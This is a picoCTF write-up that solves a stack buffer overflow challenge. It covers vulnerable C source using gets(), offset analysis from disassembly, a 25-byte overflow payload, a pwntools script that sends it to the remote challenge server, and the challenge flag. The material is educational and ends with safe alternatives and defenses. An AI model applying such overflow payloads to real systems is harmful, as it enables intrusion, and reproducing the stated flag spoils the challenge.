# picoCTF Local Target - Buffer Overflow Challenge Writeup

## Challenge Information
- **Name:** Local Target
- **Category:** Binary Exploitation
- **Description:** Smash the stack. Can you overflow the buffer and modify the other local variable?
- **Flag:** `picoCTF{l0c4l5_1n_5c0p3_ee58441a}`

## Table of Contents
1. [Initial Analysis](#initial-analysis)
2. [Source Code Review](#source-code-review)
3. [Understanding the Vulnerability](#understanding-the-vulnerability)
4. [Stack Layout Analysis](#stack-layout-analysis)
5. [Exploitation](#exploitation)
6. [Solution](#solution)
7. [Key Concepts](#key-concepts)

## Initial Analysis

### File Analysis
```bash
┌──(xuan㉿kali)-[~]
└─$ file local-target
local-target: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
BuildID[sha1]=63ee240a209d887ec451e996d844362e7e5c2078, 
for GNU/Linux 3.2.0, not stripped
```

Key observations:
- **64-bit ELF executable** for Linux
- **Not stripped**: Debug symbols present
- **No PIE**: Fixed memory addresses (easier exploitation)
- **Dynamically linked**: Uses system libraries

### Security Features Check
```bash
┌──(xuan㉿kali)-[~]
└─$ checksec local-target
[*] '/home/kali/local-target'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- **No stack canary**: Buffer overflows won't be detected
- **No PIE**: Addresses are predictable
- **NX enabled**: Can't execute shellcode on stack (but we don't need to)

## Source Code Review

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
  FILE *fptr;
  char c;
  char input[16];  // 16-byte buffer
  int num = 64;     // Target variable initialized to 64 (0x40)
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);      // VULNERABLE! No bounds checking
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){  // Win condition: num must equal 65 (0x41)
    printf("You win!\n");
    fflush(stdout);
    // Opens and prints flag.txt
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);
    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  
  printf("Bye!\n");
  fflush(stdout);
}
```

### Vulnerability Identified
- **`gets(input)`**: This deprecated function doesn't check buffer boundaries
- **Goal**: Overflow the 16-byte `input` buffer to overwrite `num` from 64 to 65

## Understanding the Vulnerability

### The Problem with `gets()`
The `gets()` function reads input until it encounters a newline character, with no limit on how many bytes it reads. This makes it inherently unsafe and it has been deprecated in modern C standards.

```c
char input[16];  // Only 16 bytes allocated
gets(input);     // Will read unlimited input!
```

If we input more than 16 characters, we'll write past the buffer into adjacent memory.

## Stack Layout Analysis

### Assembly Analysis
Looking at the key assembly instructions:

```asm
0000000000401236 <main>:
  40123e:  sub    $0x20,%rsp           # Allocate 32 bytes on stack
  401242:  movl   $0x40,-0x8(%rbp)     # num = 64 at [rbp-0x8]
  401269:  lea    -0x20(%rbp),%rax     # input buffer at [rbp-0x20]
  401270:  mov    %rax,%rdi
  401275:  call   401110 <gets@plt>     # gets(input)
  401284:  mov    -0x8(%rbp),%eax      # Load num into eax
  4012a9:  cmpl   $0x41,-0x8(%rbp)     # Compare num with 65
```

### Memory Layout

```
Stack Layout (High to Low addresses):
┌─────────────────────┐
│   Return Address    │ 
├─────────────────────┤
│    Saved RBP        │ ← RBP points here
├─────────────────────┤ [rbp-0x0]
│     (padding)       │ 
├─────────────────────┤ [rbp-0x8]
│    num = 0x40      │ ← Target variable (4 bytes)
├─────────────────────┤ [rbp-0xc]
│     (padding)       │ (4 bytes)
├─────────────────────┤ [rbp-0x10]
│                     │
│    input[16]        │ (16 bytes)
│                     │
├─────────────────────┤ [rbp-0x20] ← Buffer starts here
```

### Calculating the Offset
- **Buffer starts at**: `rbp-0x20`
- **num located at**: `rbp-0x8`
- **Distance**: `0x20 - 0x8 = 0x18 = 24 bytes`

To overwrite `num`, we need:
1. 24 bytes to fill the buffer and padding
2. The value we want to write to `num` (65 or 0x41)

## Exploitation

### Understanding the Overflow

```
Input: "AAAAAAAAAAAAAAAA" (16 A's)
Result: Fills buffer, num unchanged

Input: "AAAAAAAAAAAAAAAAAAAAAAAA" (24 A's)
Result: Fills buffer + padding, num = 0x00000000

Input: "AAAAAAAAAAAAAAAAAAAAAAAA" + 'A' (25 A's)
Result: Fills buffer + padding, num = 0x00000041 (65 in decimal!)
```

### Why 25 'A's Works

When we send 25 'A' characters:
- First 16 'A's fill the `input` buffer
- Next 8 'A's fill the padding between buffer and `num`
- The 25th 'A' (ASCII value 0x41 = 65) overwrites the first byte of `num`
- Since `num` was 0x40 (64), overwriting with 0x41 gives us exactly 65!

### Creating the Payload

We have two approaches:

#### Method 1: Using 'A' characters (Lucky coincidence!)
```bash
python3 -c "print('A' * 25)"
```
This works because 'A' has ASCII value 65 (0x41), which is exactly what we need!

#### Method 2: Explicit byte value
```python
payload = b'A' * 24  # Fill to reach num
payload += b'\x41'   # Write 65 to num
```

## Solution

### Local Testing
```bash
┌──(xuan㉿kali)-[~]
└─$ ./local-target
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA
num is 65
You win!
[Flag would be printed here if flag.txt exists]
```

### Remote Exploitation
```bash
┌──(xuan㉿kali)-[~]
└─$ nc saturn.picoctf.net 52212
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA
num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_ee58441a}
```

### Automated Exploit Script
```python
#!/usr/bin/env python3
from pwn import *

# Connect to remote server
p = remote('saturn.picoctf.net', 52212)

# Create payload: 24 bytes + overwrite with 65
payload = b'A' * 25  # 'A' = 0x41 = 65 in decimal

# Send exploit
p.recvuntil(b'Enter a string: ')
p.sendline(payload)

# Get the flag
print(p.recvall().decode())
```

## Key Concepts

### 1. **Buffer Overflow Basics**
- Buffers have fixed sizes in memory
- Writing beyond buffer boundaries affects adjacent variables
- Stack grows downward (high to low addresses)
- Data fills upward (low to high addresses)

### 2. **Stack Variable Layout**
- Local variables are stored on the stack
- Compiler may add padding for alignment
- Variables are placed at specific offsets from the base pointer (RBP)

### 3. **Vulnerable Functions**
Common unsafe functions that can cause buffer overflows:
- `gets()` - Never use, no bounds checking
- `strcpy()` - No bounds checking
- `sprintf()` - No bounds checking
- `scanf("%s")` - No length limit

Safe alternatives:
- `fgets()` - Specify maximum bytes
- `strncpy()` - Specify maximum bytes
- `snprintf()` - Specify buffer size

### 4. **Assembly Instructions and Sizes**
- `movl` / `cmpl` = 32-bit (4 bytes) operations
- `%eax` = 32-bit register (lower 32 bits of %rax)
- `int` in C = 4 bytes on x86-64 systems

### 5. **Exploitation Process**
1. Identify vulnerable function
2. Determine buffer size
3. Find target variable location
4. Calculate offset between buffer and target
5. Craft payload with correct padding
6. Overwrite target with desired value

## Lessons Learned

1. **Never use `gets()`** - It's deprecated for good reason
2. **Always validate input length** before copying to buffers
3. **Stack layout knowledge** is crucial for binary exploitation
4. **Simple overflows** can be exploited without complex techniques like shellcode
5. **ASCII values** can sometimes work in your favor ('A' = 65)

## Defense Mechanisms

This challenge would be prevented by:
- **Stack canaries**: Detect buffer overflows
- **Safe functions**: Using `fgets()` instead of `gets()`
- **Input validation**: Checking length before copying
- **Compiler warnings**: Modern compilers warn about `gets()`

## Flag Explanation
`picoCTF{l0c4l5_1n_5c0p3_ee58441a}`
- **l0c4l5_1n_5c0p3**: "locals in scope" - referring to local variables on the stack
- The challenge demonstrates how local variables in the same scope can affect each other through buffer overflows

---

*Challenge completed by: xuan*  
*Date: 2024*  
*Platform: picoCTF*
